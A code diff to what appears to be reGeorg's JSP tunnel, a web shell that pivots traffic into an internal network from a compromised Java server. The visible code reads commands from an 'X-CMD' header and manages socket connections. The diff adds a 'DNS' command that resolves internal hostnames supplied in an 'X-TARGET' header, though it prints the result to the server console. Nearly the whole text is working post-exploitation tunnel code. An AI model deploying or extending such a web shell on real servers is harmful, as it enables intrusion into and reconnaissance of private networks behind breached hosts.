@@ -24,7 +24,7 @@ to exist within your internal network.
 For more information, see:
 https://github.com/sensepost/reGeorg
 
-*/%><%@page import="java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket" trimDirectiveWhitespaces="true"%><%
+*/%><%@page import="java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket, java.net.InetAddress" trimDirectiveWhitespaces="true"%><%
     String cmd = request.getHeader("X-CMD");
     if (cmd != null) {
         response.setHeader("X-STATUS", "OK");
@@ -102,6 +102,16 @@ https://github.com/sensepost/reGeorg
                 response.setHeader("X-ERROR", e.getMessage());
                 response.setHeader("X-STATUS", "FAIL");
                 socketChannel.socket().close();
+            }
+        } else if (cmd.compareTo("DNS") == 0) {
+            try {
+                String address = InetAddress.getByName(request.getHeader("X-TARGET")).getHostAddress();
+                response.setHeader("X-STATUS", "OK");
+                System.out.print(address);
+            } catch (Exception e) {
+                System.out.println(e.getMessage());
+                response.setHeader("X-ERROR", "DNS lookup failed");
+                response.setHeader("X-STATUS", "FAIL");
             }
         } 
     } else {
